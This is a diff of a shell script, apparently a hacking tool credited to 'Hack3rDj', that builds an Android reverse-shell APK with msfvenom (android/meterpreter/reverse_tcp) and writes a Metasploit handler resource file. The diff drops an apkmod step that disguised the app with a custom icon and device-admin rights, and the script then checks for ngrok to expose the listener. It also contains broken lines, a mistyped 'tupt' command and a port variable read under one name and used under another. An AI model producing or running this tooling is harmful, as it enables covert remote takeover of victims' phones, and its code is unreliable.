@@ -6,7 +6,7 @@ clear
 echo " " 
 echo "┌───── •✧✧• ─────┐
  Made By Hack3rDj
-└───── •✧✧• ─────┘        credit goes to ghostlinux
+└───── •✧✧• ─────┘
                           ╱▔▔▔▔╲
                          ┃ ▇  ▇ ┃
                        ╭╮┣━━━━━━┫╭╮
@@ -39,7 +39,6 @@ read -p 'SET  PHOTO PATH❯❯ ' photo
 tput setaf 6; echo " "
 read -p 'SET LISTNER LPORT❯❯ ' port
 tupt setaf 2; echo " "
-read -p 'SET ICON PATH❯❯ ' icon
 cp "$photo" image.jpeg
 echo "use exploit/multi/handler" > .d.rc
 echo "set payload android/meterpreter/reverse_tcp" >> .d.rc
@@ -48,27 +47,7 @@ echo "set lport $port" >> .d.rc
 echo "exploit" >> .d.rc
 echo " "
 tput setaf 2; echo " PLEASE WAIT YOUR PAYLOAD IS CREATING"
-msfvenom -p android/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -o app.apk
-mkdir app
-apkmod -d app.apk -o app
-cd app
-rm -rf AndroidManifest.xml
-cd ..
-read -p 'DIVICE ADMIN y/n ❯❯ ' admin
-if [ "$admin" = "y" ]
-then
-	cp 1AndroidManifest.xml app && cd app && mv 1AndroidManifest.xml AndroidManifest.xml && cd res && mkdir xml && cd .. && cd .. && cp device_admin.xml app/res/xml
-else
-	cp AndroidManifest.xml app
-fi
-cd app
-cd res
-mkdir mipmap-hdpi-v4
-cd mipmap-hdpi-v4
-cp "$icon" icon.png
-cd ..
-cd ..
-apkmod -r app -o "$apn.apk"
+msfvenom -p android/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -o "$apn.apk"
 echo " "
 chmod -R 755 *
 printf "\e[1;92m[\e[0m-+\e[1;92m] Checking for Ngrok Executable...\n"
